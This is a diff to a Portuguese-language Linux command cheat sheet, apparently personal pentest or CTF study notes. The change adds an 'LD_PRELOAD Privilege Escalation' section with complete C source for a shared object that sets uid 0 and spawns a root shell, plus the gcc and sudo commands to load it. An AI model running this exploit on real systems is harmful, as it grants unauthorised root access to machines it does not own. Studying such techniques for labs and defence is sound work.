@@ -172,6 +172,26 @@ Cada entrada no arquivo crontab requer seis itens na seguinte ordem: minutos, ho
 # Mostra discos e partições montadas
 lsblk
 
+# LD_PRELOAD Privilege Escalation
+Veja se tem algum user com perm root em sudo -l
+compile esse arquivo c:
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+sudo LD_PRELOAD=/tmp/root.so caminho-do-NOPASSWD
+root
+
 # Mostra sistemas de arquivos montados automaticamente
 cat /etc/fstab
 
